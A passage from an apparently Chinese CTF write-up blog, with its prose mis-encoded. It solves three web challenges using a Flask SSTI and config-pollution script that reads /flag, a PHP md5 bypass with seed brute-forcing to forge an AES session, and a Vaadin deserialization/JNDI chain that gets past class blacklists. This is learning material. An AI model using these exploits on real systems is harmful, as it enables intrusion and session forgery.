class="keyword">import</span> requests</span><br><span class="line"> url = <span class="string">&#x27;8.153.107.251:32109&#x27;</span></span><br><span class="line"> login_url = <span class="string">f&#x27;http://<span class="subst">&#123;url&#125;</span>/login&#x27;</span></span><br><span class="line"> setUserInfo_url = <span class="string">f&#x27;http://<span class="subst">&#123;url&#125;</span>/setUserInfo&#x27;</span></span><br><span class="line"> admin_url = <span class="string">f&#x27;http://<span class="subst">&#123;url&#125;</span>/admin&#x27;</span></span><br><span class="line"> username = <span class="string">&quot;[[g.pop.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()]]&quot;</span></span><br><span class="line"> password = <span class="string">&quot;lbz&quot;</span></span><br><span class="line"> login_data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line"> &#125;</span><br><span class="line"> response0 = requests.post(login_url, data=login_data)</span><br><span class="line"> setUserInfo_data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&quot;.__init__.__globals__.app.config.SECRET_KEY&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&quot;123&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> response1 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class="line"> setUserInfo_data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&quot;.__init__.__globals__.app.jinja_env.variable_start_string&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&quot;[[&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> response2 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class="line"> setUserInfo_data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&quot;.__init__.__globals__.app.jinja_env.variable_end_string&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&quot;]]&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> response3 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class="line"> setUserInfo_data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&quot;.__init__.__globals__.WAF.blacklist&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&quot;%&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line">response4 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class="line"> session = <span class="built_in">input</span>(<span class="string">&quot;Enter the session cookie: &quot;</span>)</span><br><span class="line"> cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;session&#x27;</span>: session</span><br><span class="line"> &#125;</span><br><span class="line"> response5 = requests.get(admin_url, cookies=cookies)</span><br><span class="line"> <span class="built_in">print</span>(response5.text)</span><br></pre></td></tr></table></figure><p>â€‹session ä¼ªé€ å¯ä»¥ç”¨ flask_session_cookie_manager ã€‚</p><h3 id="ezweb"><a class="markdownIt-Anchor" href="#ezweb">#</a> ezweb</h3><p>â€‹æŸ¥çœ‹æºç ï¼Œå¾—åˆ° base64 è§£å¯†æ•°æ®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="string">&#x27;aa476cf7143fe69c29b36e4d0a793604&#x27;</span>) &#123; <span class="comment">//xxxxx2024</span></span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¼ å…¥è¿™ä¸ªç»•è¿‡å‰ä¸¤å±‚</p><blockquote><p>?a[]=a&amp;b[]=b&amp;c[]=c&amp;d[]=d</p></blockquote><p>â€‹ä¹‹åçš„ guess æ’åº“è·å¾— hECTf2024ã€‚å¾—åˆ° secret.php æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//mt_srand(rand(1e5,1e7));</span></span><br><span class="line"><span class="comment">//$key = rand();</span></span><br><span class="line"><span class="comment">//file_put_contents(*,$key);</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_decrypt</span>(<span class="params"><span class="variable">$session</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$session</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>,<span class="number">0</span>,<span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="variable">$enc</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>,<span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$enc</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, <span class="number">1</span>, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹çœ‹å‡ºæ¥åŠ å¯†ç®—æ³•ï¼ŒAES-256-CBCï¼Œkey ä¸ºéšæœºç”Ÿæˆçš„ï¼Œç§å­ä¹Ÿæ˜¯éšæœºç”Ÿæˆçš„ï¼Œå¾—çˆ†ç ´ï¼Œè´´ä¸ªå¤§ä½¬çš„è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">100000</span>; <span class="variable">$i</span> &lt; <span class="number">10000000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">rand</span>();</span><br><span class="line">    <span class="variable">$session</span> = <span class="string">&quot;ja59o5qBBFlXzx7hHeauqrsXPoilxIhW%2F5Aq9CFdqF1kGFHBVjb7TvMlEfZwG5eBukjNbEQSV9VKTLuZevUwJuX2LZ7qc9lu22V%2B368YSXWwoHTWlM9XFUY9jWip3pUo&quot;</span>;</span><br><span class="line">    <span class="variable">$session</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$session</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">session_decrypt</span>(<span class="variable">$session</span>, <span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">false</span> <span class="keyword">and</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/guest|admin/i&quot;</span>, <span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">è§£å¯†æˆåŠŸï¼è§£å¯†åçš„æ•°æ®</span></span><br><span class="line"><span class="string">&quot;</span> . (<span class="variable">$result</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Key:&quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;srand:&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_decrypt</span>(<span class="params"><span class="variable">$session</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$session</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="variable">$enc</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$enc</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, <span class="number">1</span>, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è§£å¯†æˆåŠŸï¼è§£å¯†åçš„æ•°æ®<br> O:4:â€œUserâ€:2:{s:8:â€œusernameâ€;s:5:â€œguestâ€;s:4:â€œroleâ€;s:5:â€œguestâ€;}<br>Key:1728818262<br>srand:8168720</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">session_encrypt</span>(<span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>,<span class="number">1728818262</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_encrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$iv</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$encrypted</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, <span class="number">1</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$encrypted</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$encoded</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$iv</span> . <span class="variable">$encrypted</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$encoded</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#DWuzth9WfI2ufPUB5nI99CQuFk4nBqn8g3cvtJfSb5E4wnC+d4sICqt3hONji9RbclgNtgPZLkKQPSvO6e6INHudhIc9ofgj4GYs/6mZWx+jLaaqV+5jQLCvvGtfLLD2</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå¾—åˆ°äº† flagã€‚</p><h3 id="ezjava"><a class="markdownIt-Anchor" href="#ezjava">#</a> ezjavaï¼š</h3><p>â€‹ä¸ä¼š javaï¼Œæ‰€ä»¥å…ˆæŠ„ä¸€éå­¦é•¿çš„ wpï¼Œä¹‹åå†å­¦ä¹ ä¸‹  (â•¥_â•¥)</p><p>â€‹é€šè¿‡é™„ä»¶ä¸­çš„ jar åŒ…å¯ä»¥çœ‹å‡ºæœ‰ï¼ŒCC3.2.1ã€vaadin ä¾èµ–ï¼Œæ¨æµ‹æ˜¯ç”¨ vaadin çš„é“¾å­ã€‚</p><p>â€‹é€šè¿‡åç¼–è¯‘ jar åŒ…çš„ IndexControllerï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.easyjava.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.easyjava.challenge.MyObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> com.example.easyjava.challenge.normal;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/* loaded from: EZjava.jar:BOOT-INF/classes/com/example/easyjava/Controller/IndexController.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String string;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">main</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/index.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/file&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(<span class="meta">@RequestParam</span> String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(data);</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span> || data.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;redirect:/error.html&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        string = data;</span><br><span class="line">        deserialize(string);      <span class="comment">//è¿™é‡Œå­˜åœ¨ååºåˆ—åŒ–</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/index.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">deserialize</span><span class="params">(String base64data)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] decode = Base64.getDecoder().decode(base64data.toString().replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(decode);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">normal</span>(payload).blacklist(payload)) &#123;<span class="comment">//è¿™é‡Œæœ‰é»‘åå•</span></span><br><span class="line">                <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64data.toString().replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>)));</span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">                ois.readObject();</span><br><span class="line">                ois.close();</span><br><span class="line">                <span class="keyword">return</span> ois;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;redirect:/error.html&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥çœ‹åˆ° /file è·¯ç”±ï¼Œç›´æ¥æŠŠä¼ å…¥çš„ string å­—ç¬¦ä¸²ååºåˆ—åŒ–ï¼Œå¹¶ä¸” string æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œä½†æ˜¯ä¸‹é¢æœ‰é»‘åå•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.easyjava.challenge;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: EZjava.jar:BOOT-INF/classes/com/example/easyjava/challenge/normal.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">normal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">normal</span><span class="params">(String data)</span> <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">blacklist</span><span class="params">(String data)</span> &#123;</span><br><span class="line">        String[] blacklist = &#123;<span class="string">&quot;BadAttributeValueExpException&quot;</span>, <span class="string">&quot;Collections$UnmodifiableList&quot;</span>, <span class="string">&quot;PropertysetItem&quot;</span>, <span class="string">&quot;AbstractClientConnector&quot;</span>, <span class="string">&quot;Enum&quot;</span>, <span class="string">&quot;SQLContainer&quot;</span>, <span class="string">&quot;LinkedHashMap&quot;</span>, <span class="string">&quot;TableQuery&quot;</span>, <span class="string">&quot;AbstractTransactionalQuery&quot;</span>, <span class="string">&quot;J2EEConnectionPool&quot;</span>, <span class="string">&quot;DefaultSQLGenerator&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (String list : blacklist) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data.contains(list)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°å¸¸ç”¨çš„ BadAttributeValueExpException</p><p>â€‹åé¢è¿™é‡Œé‡å†™äº† ObjectInputStream ç±»ï¼Œçœ‹ä¸€ä¸‹ MyObjectInputStream åšäº†å“ªäº›è¿‡æ»¤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.easyjava.challenge;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: EZjava.jar:BOOT-INF/classes/com/example/easyjava/challenge/MyObjectInputStream.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// java.io.ObjectInputStream</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> desc.getName().toLowerCase();</span><br><span class="line">        String[] denyClasses = &#123;<span class="string">&quot;java.net.InetAddress&quot;</span>, <span class="string">&quot;org.apache.commons.collections.Transformer&quot;</span>, <span class="string">&quot;org.apache.commons.collections.functors&quot;</span>, <span class="string">&quot;C3P0&quot;</span>, <span class="string">&quot;Jackson&quot;</span>, <span class="string">&quot;NestedMethodProperty&quot;</span>, <span class="string">&quot;TemplatesImpl&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (String str : denyClasses) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">denyClass</span> <span class="operator">=</span> str.toLowerCase();</span><br><span class="line">            <span class="keyword">if</span> (className.contains(denyClass)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, className);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹åˆ°è¿™é‡Œå¸¸ç”¨çš„ springã€jackson çš„é“¾å­éƒ½æ‰“ä¸é€šäº†ï¼Œåªèƒ½çœ‹å…³äº vaadin ä¾èµ–çš„é“¾å­ï¼Œç½‘ä¸Šå…¬å¼€çš„æ˜¯ NestedMethodProperty å’Œ SQLContainer è¿™ä¿©æ¡é“¾å­ï¼Œä½†æ˜¯åœ¨ resolveClass ä¸­ NestedMethodProperty ç±»åœ¨é»‘åå•ä¸­æ— æ³•ä½¿ç”¨</p><p>â€‹æ‰€ä»¥å¯ä»¥ç¡®å®šç”¨ SQLContainer é“¾å­ï¼Œblacklist é»‘åå•çš„å†…å®¹è¿™é‡Œç›´æ¥å¯ä»¥ç”¨ utf-8 ç¼–ç æ¥ç»•å³å¯ï¼ˆç½‘ä¸Šçš„ SQLContainer ä¸å¤ªå®Œæ•´ï¼Œéœ€è¦æ‰‹åŠ¨æœ¬åœ°è°ƒè¯•ä¸€ä¸‹ï¼‰ï¼Œæœ¬é¢˜æ˜¯å‡ºç½‘çš„ç›´æ¥ç”¨ JDBCConnectionPool ç±»æ‰“ JNDI æ³¨å…¥å³å¯</p><blockquote><p>JDBCConnectionPool#reserveConnection</p><p>â€‹getConnection</p><p>â€‹ TableQuery#  beginTransaction</p><p>â€‹TableQuery#containsRowWithkey</p><p>â€‹ containsId  ï¼ˆitem å¯æ§ï¼Œitem.getId å€¼ ==TableQueryï¼‰</p><p>â€‹ getValue   ----- è¿™ä¸€å±‚ï¼Œitem  == sqlcontainer</p><p>â€‹toString</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.Utils.ReflectionUtil;</span><br><span class="line"><span class="keyword">import</span> com.example.Utils.SerializeUtil;</span><br><span class="line"><span class="keyword">import</span> com.utf.CustomObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.PropertysetItem;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.CacheMap;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.RowId;</span><br><span class="line"><span 